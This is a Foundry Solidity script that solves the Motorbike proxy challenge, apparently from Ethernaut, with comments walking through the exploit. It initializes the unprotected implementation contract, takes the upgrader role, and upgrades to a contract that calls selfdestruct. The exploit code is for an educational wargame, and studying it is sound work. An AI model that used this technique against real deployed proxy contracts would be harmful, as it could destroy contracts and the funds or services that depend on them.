// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Motorbike, Engine} from "../src/Motorbike.sol";

contract MotorbikeSolution is Script {
    // $ forge script script/Motorbike.s.sol --tc MotorbikeSolution

    function run() external {
        address upgrader = makeAddr("upgrader");
        vm.deal(upgrader, 1 ether);
        vm.startPrank(upgrader);

        Engine engine = new Engine();
        Motorbike motorbike = new Motorbike(address(engine));

        // - The `Engine` contract is deployed using Upgradable Proxy pattern, where the `Motorbike` will be the proxy, and the `Engine` will be the implementation contract.
        // - We deployed the implementation first `Engine`, then deployed the proxy `Motorbike`, and fired `initialize()` function.
        // - Firing `initialize()` is important as it sets the upgrader address (the address that has access to the Engine contract).
        // - The deployer made a mistake here. Since he deployed the Engine as a proxy contract, the `initialize()` function gets fired in the context of the proxy `Motorbike` contract not `Engine` contract itself.
        // - So we can `initialize()` the Engine contract itself, and take the authority to upgrade its implementation.
        // - Since we have access now, we can call `upgradeToAndCall()`, and pass a function that will call `selfdestruct`.
        // - `upgradeToAndCall()` will make `delegatecall` itself, so the `selfdestruct` will occur in the `Engine` contract context.
        // - Motorbike will be useless, As it is pointing to an implementation contract that has 0 bytes. And the challenge is passed successfully.

        // NOTE: `selfdestruct` behavior changes after Dencun upgrade, and the contract will not get destroyed (setting its bytecodes to zero) when selfdestructing it.

        // --- Attack Starts From Here ---

        vm.stopPrank();
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // Getting the address in the implementation slot
        bytes32 implementationSlot =
            vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        address engineAddress = address(uint160(uint256(implementationSlot)));

        Engine engineContract = Engine(engineAddress);

        // Initialize the engine contract, to be the `upgrader`
        engineContract.initialize();

        // Deploying the contract that will selfdestructing the Engine
        AttackMotorbike attackContract = new AttackMotorbike();

        // Upgrading the implementation to the attackContract
        // Then destroying the engine Contract
        engineContract.upgradeToAndCall(
            address(attackContract), abi.encodeWithSelector(attackContract.destroy.selector)
        );

        // NOTE:
        // Since Foundry is doing all the script as a single TX, we can not test if the Engine contract is destoyed or not.
        // So we will made `console.log` before `selfdestruct` the Engine contract
    }
}

contract AttackMotorbike {
    function destroy() public {
        console.log("selfdestructing the Engine Contract");
        selfdestruct(msg.sender);
    }
}
